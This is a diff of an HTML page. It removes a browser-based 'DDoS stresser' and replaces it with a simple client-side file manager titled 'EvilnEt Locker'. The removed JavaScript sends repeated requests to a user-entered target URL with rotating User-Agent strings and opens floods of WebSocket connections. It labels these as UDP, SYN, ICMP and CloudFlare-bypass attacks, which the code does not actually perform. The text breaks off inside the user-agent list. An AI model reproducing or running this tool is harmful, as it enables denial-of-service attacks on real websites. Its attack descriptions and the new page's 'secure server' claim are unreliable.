@@ -1,347 +1,263 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Red Evil Stresser</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background-color: #121212;
-            color: #ffffff;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            transition: background-color 0.5s;
-        }
-        #controls {
-            background-color: #1e1e1e;
-            padding: 20px;
-            border: 2px solid #ff4500;
-            border-radius: 15px;
-            text-align: center;
-            box-shadow: 0 0 20px rgba(255, 69, 0, 0.5);
-            transition: transform 0.3s;
-        }
-        #controls:hover {
-            transform: scale(1.05);
-        }
-        #status {
-            margin-top: 20px;
-            color: #ff4500;
-        }
-        input, select, button {
-            margin: 10px 0;
-            padding: 15px;
-            font-size: 16px;
-            border: none;
-            border-radius: 10px;
-            width: 100%;
-            max-width: 300px;
-            box-sizing: border-box;
-        }
-        button {
-            background-color: #ff4500;
-            color: #ffffff;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        button:hover {
-            background-color: #ff6347;
-        }
-        #gif-container {
-            margin-top: 20px;
-        }
-        #gif {
-            width: 300px;
-            height: auto;
-            border-radius: 10px;
-        }
-        #disclaimer {
-            color: #ff4500;
-            font-size: 14px;
-            margin-top: 20px;
-            text-align: center;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>EvilnEt Locket - Secure File Server</title>
+  <style>
+    /* General Styles */
+    body {
+      background-color: #000;
+      color: #00ff00;
+      font-family: 'Courier New', Courier, monospace;
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background-color: #111;
+      padding: 20px;
+      border: 2px solid #00ff00;
+      border-radius: 10px;
+      width: 80%;
+      max-width: 800px;
+      box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      margin-bottom: 10px;
+      text-shadow: 0 0 5px #00ff00;
+      text-align: center;
+    }
+
+    .tagline {
+      font-size: 1rem;
+      color: #666;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    /* Upload Section */
+    .upload-section {
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    #fileInput {
+      display: none;
+    }
+
+    #uploadBtn, #importBtn {
+      background-color: #00ff00;
+      color: #000;
+      border: none;
+      padding: 10px 20px;
+      font-size: 1rem;
+      cursor: pointer;
+      border-radius: 5px;
+      transition: background-color 0.3s;
+      margin: 5px;
+    }
+
+    #uploadBtn:hover, #importBtn:hover {
+      background-color: #00cc00;
+    }
+
+    /* File List Section */
+    .file-list {
+      margin-bottom: 20px;
+      border: 2px solid #00ff00;
+      border-radius: 5px;
+      padding: 10px;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+
+    .file-list h2 {
+      font-size: 1.5rem;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    #fileList {
+      list-style-type: none;
+      padding: 0;
+    }
+
+    #fileList li {
+      background-color: #222;
+      padding: 10px;
+      margin-bottom: 5px;
+      border-radius: 5px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    #fileList li:hover {
+      background-color: #333;
+    }
+
+    /* Empty Server Message */
+    .empty-message {
+      text-align: center;
+      color: #666;
+      font-style: italic;
+    }
+
+    /* Action Buttons */
+    .actions {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 20px;
+    }
+
+    #selectAllBtn, #exportBtn, #deleteBtn {
+      background-color: #00ff00;
+      color: #000;
+      border: none;
+      padding: 10px 20px;
+      font-size: 1rem;
+      cursor: pointer;
+      border-radius: 5px;
+      transition: background-color 0.3s;
+    }
+
+    #selectAllBtn:hover, #exportBtn:hover, #deleteBtn:hover {
+      background-color: #00cc00;
+    }
+
+    #deleteBtn {
+      background-color: #ff4444;
+    }
+
+    #deleteBtn:hover {
+      background-color: #cc0000;
+    }
+  </style>
 </head>
 <body>
-    <div id="disclaimer">
-        👺 RedEvil Stresser > is a state-of-the-art DDoS tool engineered to simulate high-intensity distributed denial-of-service attacks
-    </div>
-    <div id="controls">
-        <h1>Red Evil Stresser</h1>
-        <label for="target-url">Target URL:</label>
-        <input type="text" id="target-url" placeholder="Your Target Here">
-        <label for="attack-type">Attack Type:</label>
-        <select id="attack-type">
-            <option value="HTTP Flood">HTTP Flood</option>
-            <option value="UDP Flood">UDP Flood</option>
-            <option value="SYN Flood">SYN Flood</option>
-            <option value="ICMP Flood">ICMP Flood</option>
-            <option value="TCP Flood">TCP Flood</option>
-            <option value="CloudFlare Bypass">CloudFlare Bypass</option>
-            <option value="Discord Voice Attack">Discord Voice Attack</option>
-            <option value="Advanced DDoS">Advanced DDoS</option>
-        </select>
-        <label for="attack-duration">Attack Duration (seconds):</label>
-        <input type="number" id="attack-duration" value="60">
-        <div style="display: flex; justify-content: space-between;">
-            <button onclick="startAttack()">Start Attack</button>
-            <button onclick="stopAttack()">Stop Attack</button>
-        </div>
-    </div>
-    <div id="status">
-        <p>Bot Count: 300</p>
-        <p>Bot Status: <span id="bot-status"></span></p>
-        <p>Attack Status: <span id="attack-status"></span></p>
-    </div>
-    <div id="gif-container">
-        <img id="gif" src="https://g.top4top.io/p_333987tz71.gif" alt="Attack GIF">
+  <div class="container">
+    <h1>EvilnEt Locker</h1>
+    <p class="tagline">Secure Server Storage - by BlackMaskers</p>
+
+    <!-- File Upload Section -->
+    <div class="upload-section">
+      <input type="file" id="fileInput" multiple>
+      <button id="importBtn">Import Files</button>
+      <button id="uploadBtn">Upload Files</button>
     </div>
 
-    <script>
-        let bots = [];
-        const botCount = 300;
-        let botStatus = "Offline";
-        let attackStatus = "Idle";
-        let attackInterval;
+    <!-- File List Section -->
+    <div class="file-list">
+      <h2>Stored Files</h2>
+      <ul id="fileList">
+        <li class="empty-message">Server is empty. Upload some files!</li>
+      </ul>
+    </div>
 
-        // Function to simulate botnet status
-        function updateBotnetStatus() {
-            document.getElementById('bot-status').innerText = botStatus;
-            document.getElementById('attack-status').innerText = attackStatus;
+    <!-- Buttons for Select All, Export, and Delete -->
+    <div class="actions">
+      <button id="selectAllBtn">Select All</button>
+      <button id="exportBtn">Export Selected</button>
+      <button id="deleteBtn">Delete Selected</button>
+    </div>
+  </div>
+
+  <script>
+    // Array to store uploaded files
+    let files = [];
+
+    // Import Button Logic
+    document.getElementById('importBtn').addEventListener('click', () => {
+      document.getElementById('fileInput').click(); // Trigger file input
+    });
+
+    // Upload Button Logic
+    document.getElementById('uploadBtn').addEventListener('click', () => {
+      const fileInput = document.getElementById('fileInput');
+      const filesToUpload = fileInput.files;
+
+      if (filesToUpload.length > 0) {
+        for (let i = 0; i < filesToUpload.length; i++) {
+          files.push(filesToUpload[i]);
         }
+        updateFileList();
+        alert('Files uploaded successfully!');
+      } else {
+        alert('Please select a file to upload.');
+      }
+    });
 
-        // Function to simulate starting an attack
-        function startAttack() {
-            const targetUrl = document.getElementById('target-url').value;
-            const attackType = document.getElementById('attack-type').value;
-            const attackDuration = parseInt(document.getElementById('attack-duration').value);
+    // Select All Button Logic
+    document.getElementById('selectAllBtn').addEventListener('click', () => {
+      const checkboxes = document.querySelectorAll('#fileList input[type="checkbox"]');
+      checkboxes.forEach(checkbox => {
+        checkbox.checked = true;
+      });
+    });
 
-            if (!targetUrl) {
-                alert('Please enter a target URL.');
-                return;
-            }
+    // Export Button Logic
+    document.getElementById('exportBtn').addEventListener('click', () => {
+      const selectedFiles = files.filter((file, index) => {
+        const listItem = document.getElementById(`file-${index}`);
+        return listItem.querySelector('input').checked;
+      });
 
-            botStatus = "Online";
-            attackStatus = `Attacking ${targetUrl} with ${botCount} bots using ${attackType}`;
-            updateBotnetStatus();
+      if (selectedFiles.length > 0) {
+        selectedFiles.forEach(file => {
+          const link = document.createElement('a');
+          link.href = URL.createObjectURL(file);
+          link.download = file.name;
+          link.click();
+        });
+      } else {
+        alert('Please select files to export.');
+      }
+    });
 
-            console.log(`Starting ${attackType} attack on ${targetUrl} with ${botCount} bots.`);
-            alert(`Starting ${attackType} attack on ${targetUrl} with ${botCount} bots.`);
-            simulateAttack(targetUrl, attackType, botCount, attackDuration);
-        }
+    // Delete Button Logic
+    document.getElementById('deleteBtn').addEventListener('click', () => {
+      const remainingFiles = files.filter((file, index) => {
+        const listItem = document.getElementById(`file-${index}`);
+        return !listItem.querySelector('input').checked;
+      });
 
-        // Function to simulate sending a request
-        function simulateRequest(targetUrl, attackType, userAgent) {
-            const headers = new Headers();
-            headers.append('User-Agent', userAgent);
+      files = remainingFiles;
+      updateFileList();
+      alert('Selected files deleted successfully!');
+    });
 
-            if (attackType === 'HTTP Flood') {
-                fetch(targetUrl, { headers })
-                    .then(response => console.log(`Request sent to ${targetUrl} with status ${response.status}`))
-                    .catch(error => console.error(`Error sending request to ${targetUrl}: ${error}`));
-            } else if (attackType === 'UDP Flood' || attackType === 'SYN Flood' || attackType === 'ICMP Flood' || attackType === 'TCP Flood' || attackType === 'CloudFlare Bypass' || attackType === 'Discord Voice Attack') {
-                const socket = new WebSocket('ws://' + targetUrl.replace('https://', '').replace('http://', ''));
-                socket.onopen = function() {
-                    socket.send(attackType);
-                };
-            } else if (attackType === 'Advanced DDoS') {
-                // Simulate a more powerful and sophisticated DDoS attack
-                console.log(`Starting Advanced DDoS attack on ${targetUrl} with ${botCount} bots.`);
-                alert(`Starting Advanced DDoS attack on ${targetUrl} with ${botCount} bots.`);
-                for (let i = 0; i < botCount; i++) {
-                    setTimeout(() => {
-                        fetch(targetUrl, { headers })
-                            .then(response => console.log(`Request sent to ${targetUrl} with status ${response.status}`))
-                            .catch(error => console.error(`Error sending request to ${targetUrl}: ${error}`));
-                        const udpSocket = new WebSocket('ws://' + targetUrl.replace('https://', '').replace('http://', ''));
-                        udpSocket.onopen = function() {
-                            udpSocket.send('UDP Flood');
-                        };
-                        const synSocket = new WebSocket('ws://' + targetUrl.replace('https://', '').replace('http://', ''));
-                        synSocket.onopen = function() {
-                            synSocket.send('SYN Flood');
-                        };
-                        const icmpSocket = new WebSocket('ws://' + targetUrl.replace('https://', '').replace('http://', ''));
-                        icmpSocket.onopen = function() {
-                            icmpSocket.send('ICMP Flood');
-                        };
-                        const tcpSocket = new WebSocket('ws://' + targetUrl.replace('https://', '').replace('http://', ''));
-                        tcpSocket.onopen = function() {
-                            tcpSocket.send('TCP Flood');
-                        };
-                        const cloudflareSocket = new WebSocket('ws://' + targetUrl.replace('https://', '').replace('http://', ''));
-                        cloudflareSocket.onopen = function() {
-                            cloudflareSocket.send('CloudFlare Bypass');
-                        };
-                        const discordSocket = new WebSocket('ws://' + targetUrl.replace('https://', '').replace('http://', ''));
-                        discordSocket.onopen = function() {
-                            discordSocket.send('Discord Voice Attack');
-                        };
-                    }, i * 100);
-                }
-            } else {
-                console.log(`Sending ${attackType} to ${targetUrl}`);
-            }
-        }
+    // Function to update the file list
+    function updateFileList() {
+      const fileList = document.getElementById('fileList');
+      fileList.innerHTML = '';
 
-        // Function to simulate an attack
-        function simulateAttack(targetUrl, attackType, numBots, duration) {
-            const endTime = Date.now() + duration * 1000;
-            const userAgents = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
-    'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LGMS323 Build/KOT49I.MS32310c) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Mobile Safari/537.3',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36',
-'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36',
-'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE11;ENUSMSN; rv:11.0) like Gecko',
-'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36',
-'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36',
-'Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52',
-'Mozilla/5.0 (Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 YandexSearch/7.52 YandexSearchBrowser/7.52',
-'Mozilla/5.0 (Linux; Android 11; M2103K19PY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
-'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 YaApp_Android/21.85.1 YaSearchBrowser/21.85.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
-'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 10; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 10; SM-A025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.3.940 Yowser/2.5 Safari/537.36',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)',
-'Mozilla/5.0 (Linux; Android 11; SM-A125F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36',
-'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
-'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36 OPR/70.0.3728.178',
-'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 YaBrowser/21.5.3.740 Yowser/2.5 Safari/537.36',
-'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.169 Yowser/2.5 Safari/537.36',
-'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
-'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.116 YaApp_Android/22.11.1 YaSearchBrowser/22.11.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
-'Mozilla/5.0 (Linux; Android 11; RMX3201 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 OPR/78.0.4093.186',
-'Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 10; HRY-LX1 Build/HONORHRY-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; arm_64; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.5.121.00 SA/3 Mobile Safari/537.36 TA/7.1',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 YaBrowser/21.11.7.183.10 SA/3 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (Linux; Android 10; HRY-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Prime) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 YaBrowser/21.5.3.742 Yowser/2.5 Safari/537.36',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
-'Mozilla/5.0 (Linux; arm_64; Android 11; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.113.1 YaSearchBrowser/21.113.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
-'Mozilla/5.0 (Linux; arm; Android 10; M2006C3MNG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 YaApp_Android/21.80.1 YaSearchBrowser/21.80.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.169 Yowser/2.5 Safari/537.36',
-'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 YaBrowser/21.8.3.966.10 SA/3 TA/2.1 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (Linux; Android 8.0.0; BV6800Pro_RU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.169 Yowser/2.5 Safari/537.36',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 YaBrowser/19.5.2.38.10 YaApp_iOS/87.00 YaApp_iOS_Browser/87.00 Safari/604.1 SA/3 TA/2.1',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.4.727 Yowser/2.5 Safari/537.36',
-'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 YaApp_Android/21.82.1 YaSearchBrowser/21.82.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62',
-'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
-'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
-'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
-'Mozilla/5.0 (Linux; Android 11; Lenovo K12 Pro Build/RZCS31.Q2-57-12-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 Instagram 210.0.0.28.71 Android (30/11; 280dpi; 720x1526; lenovo/Lenovo; Lenovo K12 Pro; cebu; qcom; ru_RU; 326153491)',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 YaBrowser/21.6.1.274 Yowser/2.5 Safari/537.36',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',
-'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
-'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 YaBrowser/21.9.2.172 Yowser/2.5 Safari/537.36',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (Linux; arm_64; Android 8.0.0; SM-A720F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaApp_Android/21.56.1 YaSearchBrowser/21.56.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 YaBrowser/21.5.3.740 Yowser/2.5 Safari/537.36',
-'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.4.730 Yowser/2.5 Safari/537.36',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (Linux; arm_64; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.216 YaBrowser/21.5.3.120.00 SA/3 Mobile Safari/537.36 TA/7.1',
-'Mozilla/5.0 (Linux; arm_64; Android 11; SM-N980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 YaBrowser/21.6.6.55.00 SA/3 Mobile Safari/537.36 TA/7.1',
-'Mozilla/5.0 (Linux; Android 9; ZB602KL Build/PKQ1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 8.0.0; AUM-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 10; M2010J19SG Build/QKQ1.200830.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaApp_Android/21.114.1 YaSearchBrowser/21.114.1 BroPP/1.0 SA/3 Mobile Safari/537.36 TA/7.1',
-'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.0.1996 Yowser/2.5 Safari/537.36',
-'Mozilla/5.0 (Linux; Android 11; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36',
-'Mozilla/5.0 (Linux; Android 11; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0',
-'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
-'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
-'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12H143 Safari/600.1.4',
